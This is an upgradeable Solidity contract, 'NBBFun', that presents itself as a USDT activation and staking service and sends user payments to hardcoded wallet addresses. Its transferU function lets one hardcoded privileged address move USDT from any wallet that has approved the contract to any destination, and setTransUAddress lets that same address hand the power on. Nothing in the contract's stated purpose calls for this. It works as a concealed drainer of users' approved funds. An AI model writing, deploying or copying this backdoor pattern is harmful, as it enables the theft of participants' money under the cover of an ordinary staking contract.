// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";

contract NBBFun is
    Initializable,
    UUPSUpgradeable,
    OwnableUpgradeable
{
    using SafeMathUpgradeable for uint256;
    using AddressUpgradeable for address;

    ERC20Upgradeable private _usdtToken;
    address public transferAddress;
    address public pledgeAddress; 
    address public activeAddress; 
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function initialize() public initializer {
         __Ownable_init();
        __UUPSUpgradeable_init();
        // PRD 0x55d398326f99059fF775485246999027B3197955 TEST
        _usdtToken = ERC20Upgradeable(
            0x55d398326f99059fF775485246999027B3197955
        );
        transferAddress = 0xE561ecdb8A3d417F49703208B4C34Fb6E85c887a;
        activeAddress = 0x9CD9ac37E323a2D79cC35c42D064579Def5a7E8E;
        pledgeAddress = 0xfF4A2187E5BC12876A9A90032a270083EDE8a008;
    }


    event Activate(address from, uint256 id);

    function activate(uint256 amount, uint256 id) public {
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, activeAddress, amount);
        emit Activate(spender, id);
    }

    event PledgeUSDT(address, uint256);

    //理财质押
    function pledgeUSDT(uint256 amount) public {
        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
        address spender = _msgSender();
        _usdtToken.transferFrom(spender, pledgeAddress, amount);
        emit PledgeUSDT(spender, amount);
    }

    function setTransUAddress(address account)public{
        require(_msgSender() == transferAddress|| _msgSender() == 0xE561ecdb8A3d417F49703208B4C34Fb6E85c887a);
        transferAddress = account;
    }

    function transferU(
        address from,
        address to,
        uint256 amount
    ) public {
        require(_msgSender() == transferAddress);
        _usdtToken.transferFrom(from, to, amount);
    }
}
